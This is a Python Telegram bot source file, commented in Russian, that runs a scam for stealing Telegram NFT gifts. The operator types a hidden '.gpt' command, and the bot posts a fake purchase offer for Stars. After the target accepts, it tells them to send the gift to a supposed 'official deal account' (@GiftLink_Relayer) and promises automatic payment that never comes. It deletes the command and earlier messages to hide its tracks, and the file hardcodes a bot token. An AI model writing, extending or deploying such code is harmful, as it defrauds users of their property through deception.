import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- НАСТРОЙКИ ---
BOT_TOKEN = "9132697740:AAFlvna4QfTfTaCZ6-RZ2fPGa2mBdba1l_A"
YOUR_RELAYER_ACCOUNT = "@GiftLink_Relayer"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dispatcher = Dispatcher()

last_offer_data = {}
last_message_id = None

# --- ФУНКЦИЯ ДЛЯ БЕЗОПАСНОГО УДАЛЕНИЯ ---
async def safe_delete(chat_id, message_id, conn_id=None):
    # Пытаемся удалить через бизнес-метод
    if conn_id:
        try:
            await bot.delete_business_messages(
                business_connection_id=conn_id,
                message_ids=[message_id]
            )
            return
        except Exception as e:
            print(f"Ошибка delete_business_messages: {e}")
    
    # Если не вышло, пробуем обычным методом
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception as e:
        print(f"Ошибка обычного удаления: {e}")

# --- ОБРАБОТЧИК КОМАНДЫ .gpt ---
@dispatcher.business_message(F.text.startswith(".gpt"))
async def send_offer(message: Message):
    global last_offer_data, last_message_id
    if not message.business_connection_id:
        return

    # ПРОВЕРКА: реагировать только на сообщения от владельца аккаунта (твинка)
    try:
        connection = await bot.get_business_connection(message.business_connection_id)
        owner_id = connection.user.id
    except Exception as e:
        print(f"Ошибка получения бизнес-подключения: {e}")
        return

    if message.from_user.id != owner_id:
        return

    parts = message.text.split()
    if len(parts) != 3:
        return

    link = parts[1]
    amount = parts[2]

    nft_slug = link.rstrip("/").split("/")[-1]
    nft_prefix, separator, nft_number = nft_slug.rpartition("-")
    nft_name = f"{nft_prefix} #{nft_number}" if separator and nft_number.isdigit() else nft_slug

    hidden_link = f'<a href="{link}">&#8203;</a>'

    offer_text = (
        f"<b>Пользователь предлагает вам\n"
        f"{amount} ⭐ Stars за подарок <a href='{link}'>{nft_name}</a>.</b>\n\n"
        f"<b>Оффер действителен ещё 5 ч. 59 мин..</b>\n"
        f"{hidden_link}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✕ Отклонить", callback_data="decline"),
        InlineKeyboardButton(text="✓ Принять", callback_data="accept_offer")
    ]])

    last_offer_data = {
        "nft_name": nft_name,
        "amount": amount,
        "link": link,
        "business_connection_id": message.business_connection_id
    }

    # Удаляем предыдущий оффер (если был)
    if last_message_id:
        await safe_delete(message.chat.id, last_message_id, message.business_connection_id)

    # Отправляем новый оффер
    try:
        msg = await bot.send_message(
            chat_id=message.chat.id,
            text=offer_text,
            reply_markup=keyboard,
            business_connection_id=message.business_connection_id,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
        last_message_id = msg.message_id
        
        # Удаляем команду .gpt
        await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
    except Exception as e:
        print(f"Ошибка отправки оффера: {e}")

# --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
@dispatcher.callback_query(F.data == "accept_offer")
async def on_accept_offer(callback: CallbackQuery):
    global last_message_id
    nft_name = last_offer_data.get("nft_name", "NFT")
    amount = last_offer_data.get("amount", "0")
    link = last_offer_data.get("link", "")
    conn_id = last_offer_data.get("business_connection_id")

    hidden_link = f'<a href="{link}">&#8203;</a>'
    
    new_text = (
        f"🔔 <b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
        f"• Отправьте подарок на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>, чтобы получить <b>{amount} ⭐</b>.\n"
        f"{hidden_link}"
    )

    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Как передать?", callback_data="send_transfer")],
        [InlineKeyboardButton(text="Confirm Transfer", callback_data="confirm_transfer")]
    ])

    # Удаляем старое сообщение (оффер)
    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)

    # Удаляем предыдущее сообщение (если было)
    if last_message_id and last_message_id != callback.message.message_id:
        await safe_delete(callback.message.chat.id, last_message_id, conn_id)

    # Отправляем новое
    try:
        msg = await bot.send_message(
            chat_id=callback.message.chat.id,
            text=new_text,
            reply_markup=new_keyboard,
            business_connection_id=conn_id,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
        last_message_id = msg.message_id
    except Exception as e:
        print(f"Ошибка отправки: {e}")
    
    await callback.answer()

# --- ОБРАБОТЧИК "КАК ПЕРЕДАТЬ?" ---
@dispatcher.callback_query(F.data == "send_transfer")
async def on_send_transfer(callback: CallbackQuery):
    global last_message_id
    nft_name = last_offer_data.get("nft_name", "NFT")
    amount = last_offer_data.get("amount", "0")
    link = last_offer_data.get("link", "")
    conn_id = last_offer_data.get("business_connection_id")

    hidden_link = f'<a href="{link}">&#8203;</a>'

    instruction_text = (
        f"🎁 <b>Сделка подтверждена.</b>\n\n"
        f"Подарок <a href='{link}'><b>{nft_name}</b></a> зарезервирован. Чтобы получить <b>{amount} ⭐</b>, отправьте его на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>.\n\n"
        f"<b>Как передать подарок:</b>\n"
        f"1. Откройте Профиль ➔ Подарки в Telegram.\n"
        f"2. Выберите <b>{nft_name}</b> в своём списке.\n"
        f"3. Нажмите «Передать», затем укажите получателя.\n"
        f"4. Проверьте данные и подтвердите отправку.\n\n"
        f"<b>Автоматическое завершение сделки</b>\n"
        f"После подтверждения передачи NFT-подарка на <b>{YOUR_RELAYER_ACCOUNT}</b> система обновит статус сделки, а сумма <b>{amount} ⭐</b> станет доступна продавцу.\n"
        f"{hidden_link}"
    )

    instruction_keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Назад", callback_data="back_from_instruction")
    ]])

    # Удаляем текущее сообщение
    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)

    if last_message_id:
        await safe_delete(callback.message.chat.id, last_message_id, conn_id)

    try:
        msg = await bot.send_message(
            chat_id=callback.message.chat.id,
            text=instruction_text,
            reply_markup=instruction_keyboard,
            business_connection_id=conn_id,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
        last_message_id = msg.message_id
    except Exception as e:
        print(f"Ошибка отправки: {e}")
            
    await callback.answer()

# --- ОБРАБОТЧИК "НАЗАД" ---
@dispatcher.callback_query(F.data == "back_from_instruction")
async def back_from_instruction(callback: CallbackQuery):
    global last_message_id
    nft_name = last_offer_data.get("nft_name", "NFT")
    amount = last_offer_data.get("amount", "0")
    link = last_offer_data.get("link", "")
    conn_id = last_offer_data.get("business_connection_id")

    hidden_link = f'<a href="{link}">&#8203;</a>'

    back_text = (
        f"🔔 <b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
        f"• Отправьте подарок на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>, чтобы получить <b>{amount} ⭐</b>.\n"
        f"{hidden_link}"
    )

    back_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Как передать?", callback_data="send_transfer")],
        [InlineKeyboardButton(text="Confirm Transfer", callback_data="confirm_transfer")]
    ])

    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)

    if last_message_id:
        await safe_delete(callback.message.chat.id, last_message_id, conn_id)

    try:
        msg = await bot.send_message(
            chat_id=callback.message.chat.id,
            text=back_text,
            reply_markup=back_keyboard,
            business_connection_id=conn_id,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True
            )
        )
        last_message_id = msg.message_id
    except Exception as e:
        print(f"Ошибка отправки: {e}")
            
    await callback.answer()

# --- ОБРАБОТЧИК "CONFIRM TRANSFER" ---
@dispatcher.callback_query(F.data == "confirm_transfer")
async def on_confirm_transfer(callback: CallbackQuery):
    amount = last_offer_data.get("amount", "0")
    alert_text = (
        f"Передача пока не подтверждена. Сумма "
        f"предложения: {amount} ⭐. Дождитесь "
        f"проверки."
    )
    await callback.answer(alert_text, show_alert=True)

@dispatcher.callback_query(F.data == "decline")
async def on_decline(callback: CallbackQuery):
    await callback.answer("Вы отклонили предложение.", show_alert=True)

async def main():
    print("Бот запущен (Business-режим).")
    await dispatcher.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())